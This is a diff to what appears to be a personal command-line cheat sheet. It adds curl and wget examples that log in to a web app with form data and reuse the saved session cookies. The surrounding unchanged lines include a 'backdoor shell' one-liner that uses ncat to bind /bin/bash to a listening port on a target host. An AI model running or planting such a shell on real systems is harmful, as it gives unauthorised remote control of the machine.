@@ -287,6 +287,28 @@ webkit2png https://google.com           # Screenshot web page
 webkit2png google.htm                   # Screenshot saved web page
 ls *.html | xargs -n1 webkit2png        # Screenshot many saved web pages
 
+# Curl: log in with cookies
+curl \
+  --request POST \
+  --cookie-jar cookies.txt \
+  --form 'username=awdeorio' \
+  --form 'password=password' \
+  --form 'submit=login' \
+  ${BASE_URL}/accounts/login/
+curl \
+  --cookie cookies.txt \
+  ${BASE_URL}/api/
+
+# Wget: log in with cookies
+wget \
+  --post-data 'username=awdeorio&password=password&submit=login' \
+  --save-cookies cookies.txt \
+  --keep-session-cookies \
+  ${BASE_URL}/accounts/login/
+wget \
+  --load-cookies cookies.txt \
+  ${BASE_URL}/api/
+
 # Backdoor shell using netcat
 # Note: this version of netcat (ncat) ships with nmap
 TARGET_HOST $ ncat -lvp 8080 -e /bin/bash --ssl
